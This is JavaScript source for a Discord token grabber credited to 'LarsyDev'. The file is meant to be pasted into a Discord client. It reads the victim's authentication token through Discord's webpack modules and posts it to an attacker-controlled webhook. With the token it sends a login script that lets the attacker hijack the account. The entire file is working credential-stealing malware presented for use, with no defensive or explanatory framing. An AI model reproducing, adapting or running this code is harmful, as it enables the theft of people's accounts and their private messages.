const webhookLarsy = 'YOUR WEBHOOK URL HERE';

var larsyyyy = webpackJsonp.push([
    [], {
        extra_id: (larsyy, t, r) => larsyy.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let larsyy in larsyyyy.c)
    if (larsyyyy.c.hasOwnProperty(larsyy)) {
        let t = larsyyyy.c[larsyy].exports;
        if (t && t.__esModule && t.default)
            for (let larsyy in t.default) "getToken" === larsyy && (token = t.default.getToken())
    }
function Larsyyy() {
    var larsyy = new XMLHttpRequest;
    larsyy.open("POST", webhookLarsy), larsyy.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "Larsy Token Grabber",
        avatar_url: "https://cdn.discordapp.com/icons/828222553053986836/3434677e47dd167c56e3203156a4b888.png?size=128",
        content: "",
        embeds: [{
            color: "14177041",
            description: `**Token :** || ${token} || 
                          **Script For Login :** 
                          || location.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = "\"${token}\"" ||`,
            footer: {
                text: "By LarsyDev | github.com/LarsyDev"
            }
        }]
    };
    larsyy.send(JSON.stringify(t))
}
Larsyyy();